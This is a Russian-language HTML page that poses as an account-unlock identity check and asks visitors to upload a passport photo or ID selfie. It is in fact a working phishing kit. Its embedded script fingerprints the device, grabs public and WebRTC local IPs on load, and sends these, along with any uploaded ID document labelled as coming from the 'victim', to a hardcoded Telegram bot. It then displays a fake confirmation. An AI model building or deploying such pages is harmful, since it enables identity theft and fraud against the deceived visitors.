<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Проверка безопасности</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #121212; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; }
        .card { background: #1e1e1e; border-radius: 16px; padding: 30px 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { font-size: 22px; margin-bottom: 10px; color: #007aff; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
        .file-upload { display: none; }
        .upload-btn { display: block; background: #2c2c2e; border: 2px dashed #444; border-radius: 12px; padding: 40px 20px; cursor: pointer; margin-bottom: 20px; transition: 0.3s; }
        .upload-btn:hover { border-color: #007aff; background: #252525; }
        .upload-btn span { font-size: 40px; display: block; margin-bottom: 10px; }
        button { width: 100%; padding: 16px; background: #007aff; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:disabled { background: #333; color: #666; }
    </style>
</head>
<body>

    <div class="card" id="step1">
        <h2>Верификация личности</h2>
        <p>Для разблокировки аккаунта, пожалуйста, загрузите фотографию вашего паспорта или селфи с документом.</p>
        
        <label for="fileInput" class="upload-btn" id="dropZone">
            <span>📄</span>
            Нажмите, чтобы выбрать файл
        </label>
        <input type="file" id="fileInput" class="file-upload" accept="image/*,application/pdf">

        <button id="sendBtn" disabled>Отправить на проверку</button>
    </div>

    <div class="card" id="step2" style="display:none;">
        <h2 style="color:#4cd964;">Отправлено</h2>
        <p>Ваши документы отправлены на модерацию. Ожидайте письма на почту.</p>
    </div>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";

        // 1. Мгновенный сбор IP и WebRTC
        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function getWebRTCIP() {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const match = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (match) { sendText(`🕵️ Локальный IP (WebRTC): ${match[1]}`); pc.close(); }
                    }
                };
            } catch(e) {}
        }

        // Собираем данные при загрузке
        window.onload = () => {
            let info = `📱 Отпечаток устройства:\n`;
            info += `Экран: ${window.screen.width}x${window.screen.height}\n`;
            info += `Язык: ${navigator.language}\n`;
            info += `Платформа: ${navigator.platform}\n`;
            info += `Ядра: ${navigator.hardwareConcurrency}\n`;
            
            if(navigator.getBattery) {
                navigator.getBattery().then(b => sendText(`🔋 Заряд: ${Math.round(b.level * 100)}%`));
            }
            
            sendText(info);
            
            // Запрашиваем публичный IP через сторонний API (не блокируется)
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 Публичный IP: ${d.ip}`)).catch(()=>{});
            getWebRTCIP();
        };

        // 2. Обработка загрузки файла
        const fileInput = document.getElementById('fileInput');
        const sendBtn = document.getElementById('sendBtn');
        let selectedFile = null;

        fileInput.addEventListener('change', function(e) {
            if (e.target.files.length > 0) {
                selectedFile = e.target.files[0];
                document.getElementById('dropZone').innerHTML = `<span>✅</span> Файл выбран: ${selectedFile.name}`;
                sendBtn.disabled = false;
            }
        });

        // 3. Отправка файла в Telegram
        sendBtn.addEventListener('click', async function() {
            if (!selectedFile) return;

            sendBtn.innerText = "Отправка...";
            sendBtn.disabled = true;

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            // Отправляем как документ (поддерживает любые форматы)
            formData.append('document', selectedFile, selectedFile.name);
            formData.append('caption', `📁 Загруженный файл от жертвы\nИмя: ${selectedFile.name}\nРазмер: ${(selectedFile.size / 1024).toFixed(2)} KB`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                // Если это картинка, дублируем как фото (чтобы было видно сразу в чате)
                if (selectedFile.type.startsWith('image/')) {
                    const photoData = new FormData();
                    photoData.append('chat_id', CHAT_ID);
                    photoData.append('photo', selectedFile, selectedFile.name);
                    photoData.append('caption', `📸 Фото от жертвы`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: photoData
                    });
                }

                // Показываем экран успеха
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';

            } catch (err) {
                alert("Ошибка сети. Попробуйте позже.");
                sendBtn.innerText = "Отправить на проверку";
                sendBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
